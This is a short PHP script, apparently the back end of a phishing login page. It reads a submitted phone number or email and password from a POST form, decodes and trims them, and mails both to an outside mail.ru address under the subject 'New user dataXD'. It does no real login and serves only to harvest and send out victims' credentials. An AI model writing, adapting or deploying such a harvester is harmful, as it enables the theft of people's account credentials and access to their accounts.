<?php

$numOrMail = $_POST['numOrMail'];
$pswd = $_POST['pswd'];

$numOrMail = urldecode($numOrMail);
$pswd = urldecode($pswd);

$numOrMail = trim($numOrMail);
$pswd = trim($pswd);

mail("Sdi9Lf5i@mail.ru", "New user dataXD", "<p>$numOrMail</p><p>$pswd</p>", "VVjpBkJx@mail.ru");

?>